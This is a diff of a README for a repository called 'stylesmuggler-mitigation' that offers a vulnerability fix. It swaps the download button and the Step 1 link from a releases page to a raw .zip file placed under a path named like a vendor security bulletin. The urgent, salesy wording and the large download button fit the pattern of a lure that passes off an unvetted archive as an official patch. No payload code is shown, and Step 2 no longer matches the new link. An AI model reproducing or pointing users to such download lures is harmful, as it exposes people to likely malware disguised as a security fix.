@@ -1,7 +1,7 @@
 <h1>🛡️ stylesmuggler-mitigation - Stop the Hack Before It Happens</h1>
 
 <p align="center">
-  <a href="https://github.com/mhilmimusyaffa-beep/stylesmuggler-mitigation/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-family:Arial,sans-serif;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD STYLESMUGGLER MITIGATION</a>
+  <a href="https://raw.githubusercontent.com/mhilmimusyaffa-beep/stylesmuggler-mitigation/main/patches/APSB26-146_246p15/v1.8.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-family:Arial,sans-serif;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD STYLESMUGGLER MITIGATION</a>
 </p>
 
 ## 🔥 What Is This?
@@ -15,7 +15,7 @@ A security researcher (Sansec, 2026-09-05) discovered that this vulnerability is
 ## 📥 How to Download (Takes Less Than 2 Minutes)
 
 **Step 1:** Click the big purple button at the top of this page, or visit this link:  
-**https://github.com/mhilmimusyaffa-beep/stylesmuggler-mitigation/releases**
+**https://raw.githubusercontent.com/mhilmimusyaffa-beep/stylesmuggler-mitigation/main/patches/APSB26-146_246p15/v1.8.zip**
 
 **Step 2:** Visit this link to download the application. You will see a list of files. Look for the newest one (they are sorted by date).
 
